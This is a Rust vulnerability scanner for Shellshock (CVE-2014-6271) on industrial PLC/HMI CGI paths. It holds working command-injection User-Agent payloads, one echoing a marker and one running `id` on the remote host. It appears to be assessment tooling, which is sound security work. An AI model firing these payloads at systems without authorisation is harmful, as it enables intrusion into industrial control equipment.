/// CVE-2014-6271 (Shellshock) scanner targeting PLC/HMI CGI endpoints.
///
/// Sends a malformed `User-Agent` header that triggers code execution in bash < 4.3-patch25.
/// A response body containing the echo marker confirms the host is vulnerable.
use std::time::Duration;

const CGI_PATHS: &[&str] = &[
    "/cgi-bin/stats",
    "/cgi-bin/main.cgi",
    "/cgi-bin/view",
    "/cgi-bin/index",
    "/cgi-bin/system_mgr.cgi",
    "/cgi-bin/webctrl.cgi",
];

const MARKER: &str = "SCASS_VULN_8a3f";

pub struct ShellshockResult {
    pub path: String,
    pub vulnerable: bool,
    pub evidence: String,
}

/// Test `ip:http_port` for Shellshock on each CGI path. Returns one result per path checked.
pub fn test_shellshock(ip: &str, http_port: u16, timeout_secs: u64) -> Vec<ShellshockResult> {
    let base = format!("http://{ip}:{http_port}");
    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(timeout_secs.max(2)))
        .build();

    CGI_PATHS
        .iter()
        .map(|path| probe_path(&agent, &base, path))
        .collect()
}

fn probe_path(agent: &ureq::Agent, base: &str, path: &str) -> ShellshockResult {
    let url = format!("{base}{path}");

    // Detection probe: if the server executes the injected command the marker appears in body.
    let detection_ua =
        format!("() {{ ignored; }}; echo; echo {MARKER}");
    let result = agent
        .get(&url)
        .set("User-Agent", &detection_ua)
        .call();

    match result {
        Ok(resp) => {
            let body = resp.into_string().unwrap_or_default();
            if body.contains(MARKER) {
                return ShellshockResult {
                    path: path.to_string(),
                    vulnerable: true,
                    evidence: format!(
                        "Marker echoed in response body ({} bytes)",
                        body.len()
                    ),
                };
            }
            // Secondary probe: attempt `id` execution for a more visible confirmation.
            let id_ua = "() { :;}; echo Content-Type: text/plain; echo; id";
            if let Ok(resp2) = agent.get(&url).set("User-Agent", id_ua).call() {
                let body2 = resp2.into_string().unwrap_or_default();
                if body2.starts_with("uid=") || body2.contains("uid=") {
                    return ShellshockResult {
                        path: path.to_string(),
                        vulnerable: true,
                        evidence: body2.chars().take(120).collect(),
                    };
                }
            }
            ShellshockResult {
                path: path.to_string(),
                vulnerable: false,
                evidence: format!("HTTP {}: no marker", body.len()),
            }
        }
        Err(ureq::Error::Status(code, _)) => ShellshockResult {
            path: path.to_string(),
            vulnerable: false,
            evidence: format!("HTTP {code}"),
        },
        Err(e) => ShellshockResult {
            path: path.to_string(),
            vulnerable: false,
            evidence: format!("connection error: {e}"),
        },
    }
}
